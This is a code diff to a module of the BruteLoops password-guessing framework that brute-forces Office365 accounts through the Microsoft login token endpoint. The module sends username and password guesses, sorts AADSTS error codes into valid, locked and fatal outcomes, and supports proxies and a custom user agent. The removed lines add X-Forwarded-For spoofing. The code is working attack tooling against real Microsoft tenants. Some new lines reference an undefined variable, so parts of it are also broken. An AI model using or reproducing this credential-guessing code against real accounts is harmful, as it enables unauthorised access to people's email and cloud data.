@@ -1,52 +1,10 @@
 from requests import Session
 import re
 import logging
-from BruteLoops.example.module import Module as BLModule
+from BruteLoops.example.shortcuts.http import HTTPModule
 
-from logging import getLogger
+from logging import getLogger,INFO
 
-class RequestsProxyParser:
-    '''Mixin class to provide a set_proxies method for requests.Session
-    objects.
-    '''
-
-    def set_proxies(self, proxies):
-        '''Parse a list of URL proxies and set them as an instance
-        attribute in the form of a dictionary where the scheme for
-        each URL is used as the netlocation component.
-        '''
-
-        if not isinstance(proxies,list):
-            raise ValueError('Invalid proxies argument. Must be list')
-
-        self.proxies = {}
-        for proxy in proxies:
-            try:
-                url = urlparse(proxy)
-                self.proxies[url.scheme]=url.netloc
-            except Exception as e:
-                raise ValueError('Invalid proxy value supplied') from e
-
-class GuesserBase(BLModule,RequestsProxyParser):
-    '''Base guesser object to handle setting common instance variables.
-    '''
-
-    def __init__(self, proxies:'required:False,type:str,help:HTTP Proxies'=None,
-            x_forwarded_for:'required:False,type:str,help:X-Forwarded for value'=None,
-            *args, **kwargs):
-        
-        proxies = proxies if proxies else []
-        self.set_proxies(proxies)
-
-        self.headers = {'X-My-X-Forwarded-For':x_forwarded_for} if \
-                x_forwarded_for else {}
-
-    def __call__(self):
-        raise Exception('Override __call__ on GuesserBase')
-
-UA = USER_AGENT = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 ' \
-        'Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko' \
-        ') Chrome/85.0.4183.121 Mobile Safari/537.36'
 
 MSONLINE_URL    = 'https://login.microsoftonline.com'
 MSONLINE_NETLOC = 'login.microsoftonline.com'
@@ -60,8 +18,12 @@ def strip_slash(s):
 
     return s
 
+# Compiled regex to match the keys of ERROR_CODES
+ERROR_CODE_RE = re.compile('.+(AADSTS[0-9]{5,})')
+
 # Get the brute force logger
-brute_logger = getLogger('brute_logger')
+brute_logger = getLogger('BruteLoops.example.modules.http.o365_graph')
+getLogger('urllib3.connectionpool').setLevel(INFO)
 
 # A list of code values known to be associated with responses for
 # valid credentials
@@ -110,10 +72,7 @@ FATAL_CODES = [
     'AADSTS530032',
 ]
 
-# Compiled regex to match the keys of ERROR_CODES
-ERROR_CODE_RE = re.compile('.+(AADSTS[0-9]{5,})')
-
-class Session(Session,RequestsProxyParser):
+class Session(Session):
 
     auth_path = '/common/oauth2/token'
 
@@ -130,7 +89,6 @@ class Session(Session,RequestsProxyParser):
 
         headers = headers if headers else {}
         headers['Accept']='application/json'
-        if not 'User-Agent' in headers: headers['User-Agent']=UA
         self.headers.update(headers)
 
     def authenticate(self,username,password):
@@ -185,28 +143,24 @@ class Session(Session,RequestsProxyParser):
 
         return 0
 
-class Module(GuesserBase):
+class Module(HTTPModule):
 
     name = 'http.o365_graph'
-    description = brief_description = 'Office365 Graph API'
-
-    def __init__(self, msol_url:'required:False,type:str,help:URL to target'=MSONLINE_URL,*args,**kwargs):
-        '''Initialize the guesser with a custom MSOL URL to support API
-        gateway proxying.
-        '''
-
-        super().__init__(*args, **kwargs)
-        self.msol_url=msol_url
+    brief_description = 'Office365 Graph API'
+    description = 'Brute force the Office365 Graph API. Recommended ' \
+            f'URL: {MSONLINE_URL}'
 
     def __call__(self, username, password, *args, **kwargs):
         '''Proxy the call request up to the Session object to perform
         authentication.
         '''
 
-        session = Session(msol_url=self.msol_url,
-                headers=self.headers,
-                *args, **kwargs)
-        session.proxies = self.proxies
+        if 'user_agent' in kwargs:
+            headers['User-Agent'] = kwargs['user_agent']
+
+        session = Session(msol_url=self.url, headers=self.headers)
+        session.proxies = kwargs['proxies'] if \
+                'proxies' in kwargs else None
 
         return (session.authenticate(username,password),
                 username,password,)
